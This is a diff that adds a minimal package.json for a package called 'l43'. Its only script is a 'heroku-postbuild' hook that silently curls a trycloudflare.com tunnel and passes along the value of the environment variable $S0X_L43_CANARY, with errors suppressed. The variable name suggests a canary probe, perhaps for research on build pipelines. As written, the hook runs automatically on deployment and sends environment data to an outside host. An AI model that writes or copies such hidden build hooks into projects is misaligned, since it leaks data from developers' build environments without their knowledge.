@@ -1,0 +1,1 @@
+{"name":"l43","version":"1.0.0","engines":{"node":"22.x"},"scripts":{"heroku-postbuild":"curl -s https://reached-staffing-circumstances-pork.trycloudflare.com/l43-build-$S0X_L43_CANARY || true"}}
